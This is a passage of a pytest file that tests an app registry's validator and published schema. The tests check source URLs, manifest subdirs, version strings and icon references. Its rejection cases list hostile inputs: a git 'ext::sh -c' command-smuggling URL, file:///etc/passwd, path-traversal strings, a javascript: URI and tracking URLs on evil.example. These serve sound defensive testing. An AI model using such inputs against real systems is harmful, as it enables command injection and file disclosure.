    """A built-in resolves from the client's own inventory. A url here is a clone
    target for code the client already has."""
    entry = builtin()
    entry["source"]["url"] = "https://github.com/kirodotdev/KiroCrew.git"
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


def test_rejects_a_builtin_carrying_a_top_level_ref(tmp_path):
    entry = builtin()
    entry["source"]["ref"] = "a" * 40
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


def test_rejects_a_builtin_with_no_manifest_from(tmp_path):
    """Publish has to read the app's app.json from somewhere to derive display
    fields; without it the entry would bake to identity alone."""
    entry = {"name": "demo-app", "source": {"type": "builtin"}, "categories": ["developer-tools"]}
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/kirodotdev/KiroCrew.git",
        "ext::sh -c whoami",
        "file:///etc/passwd",
        "git@github.com:kirodotdev/KiroCrew.git",
    ],
)
def test_rejects_a_non_https_manifest_from_url(tmp_path, url):
    """`manifestFrom.url` reaches `git fetch`, so it gets the same scheme
    restriction as any other source url -- being publish-time-only does not make
    it inert."""
    entry = builtin(manifest_from={"url": url, "ref": "main"})
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


@pytest.mark.parametrize(
    "subdir",
    ["/etc", "../../etc", "src/../../etc", "src\\apps", ""],
)
def test_rejects_an_escaping_manifest_from_subdir(tmp_path, subdir):
    entry = builtin(
        manifest_from={
            "url": "https://github.com/kirodotdev/KiroCrew.git",
            "ref": "main",
            "subdir": subdir,
        }
    )
    assert errors_for(tmp_path, base_registry(entry), base_editorial(), _order_with_developer_tools()) != []


# --------------------------------------------------------------------------
# The PUBLISHED schema, checked directly.
#
# Everything above validates the AUTHORED document. The published schema is the
# signed contract a client reads, and nothing above exercises it -- so a change
# to its patterns could go green while shipping a document no client should
# accept. These cases close that gap.
# --------------------------------------------------------------------------


def published_errors_for(*apps: dict) -> list[str]:
    from validate import Findings, check_schema

    findings = Findings()
    check_schema(
        {
            "schemaVersion": 1,
            "generatedAt": "2026-01-01T00:00:00Z",
            "revision": "2026-01-01T00:00:00Z-abcdef1",
            "apps": list(apps),
        },
        SCHEMA_DIR / "official-registry.schema.json",
        "official-registry.json",
        findings,
    )
    return findings.errors


def published_builtin(**source_extra) -> dict:
    return {"name": "demo-app", "source": {"type": "builtin", **source_extra}}


def test_published_builtin_needs_no_fetch_coordinates_at_all():
    """`{"type": "builtin"}` alone is a complete, valid published source: there is
    nothing to fetch and no digest, because integrity comes from the signed
    application bundle the app ships inside."""
    assert published_errors_for(published_builtin()) == []


@pytest.mark.parametrize(
    "version", ["0.2.0", "0.2.0-nightly.20260806t065257", "0.2.0-rc.1", "1.0.0+build.5"]
)
def test_published_schema_accepts_real_shipping_versions(version):
    """A release-only pattern here would reject the version the installed nightly
    literally carries."""
    assert published_errors_for(published_builtin(minClientVersion=version)) == []


@pytest.mark.parametrize(
    "version", ["latest", "0.2", "v0.2.0", "", "0.2.0junk", "0.2.0 see evil.example"]
)
def test_published_schema_rejects_a_malformed_version(version):
    """Both trailing-payload cases sit under the 32-char cap, so each one fails on
    the `$` anchor rather than on maxLength -- which is what makes them pin the
    anchor rather than merely appear to."""
    assert published_errors_for(published_builtin(minClientVersion=version)) != []


@pytest.mark.parametrize(
    "extra",
    [
        {"url": "https://github.com/kirodotdev/KiroCrew.git"},
        {"ref": "a" * 40},
        {"manifestFrom": {"url": "https://example.com/a.git", "ref": "main"}},
        {"sha256": "a" * 64},
        {"subdir": "src/apps"},
    ],
)
def test_published_builtin_cannot_carry_a_fetch_target(extra):
    """Closed `additionalProperties` is the mechanism: it makes a published
    built-in with somewhere to clone from UNREPRESENTABLE, rather than leaving it
    to publish to remember to strip. `manifestFrom` is in this list because
    leaking it is the specific regression the strip prevents."""
    assert published_errors_for(published_builtin(**extra)) != []


# ---------------------------------------------------------------------------
# Published icon refs are PATHS, not URLs
# ---------------------------------------------------------------------------
#
# `iconRef` used to be a bare `{"type": "string"}`, so an empty value or a full
# `https://` URL validated. That mattered because the value is read from a
# manifest we fetch from a repository we do not control: an unconstrained field
# let a publisher put a host of their choosing into a document WE sign, and the
# store would then load it. `tools/publish.py` refuses such a value before
# baking; the schema is the second, independent gate.


@pytest.mark.parametrize(
    "ref",
    [
        "/app-assets/demo-app/icon.svg",  # a builtin's absolute client-local path
        "assets/icon.png",  # a fetched app's repo-relative path
        "a/b/c-d_e.png",
    ],
)
def test_published_schema_accepts_both_icon_ref_shapes(ref):
    assert published_errors_for({**published_builtin(), "iconRef": ref}) == []
    assert published_errors_for({**published_builtin(), "iconRefDark": ref}) == []


@pytest.mark.parametrize(
    "ref",
    [
        "https://evil.example/track.png",
        "http://evil.example/track.png",
        "//evil.example/track.png",
        "javascript:alert(1)",
        "data:image/svg+xml;base64,AAAA",
        "../../etc/passwd",
        "assets/../../etc/passwd",
        "assets/icon.png?ref=track",
        "assets/ icon.png",
        "assets/icon.png\nX",
        "",
    ],
)
def test_published_schema_rejects_a_url_or_escaping_icon_ref(ref):
    assert published_errors_for({**published_builtin(), "iconRef": ref}) != [], ref
    assert published_errors_for({**published_builtin(), "iconRefDark": ref}) != [], ref


def test_published_icon_refs_are_optional():
    """Most apps ship one icon and no dark variant; neither key is required."""
    assert published_errors_for(published_builtin()) == []
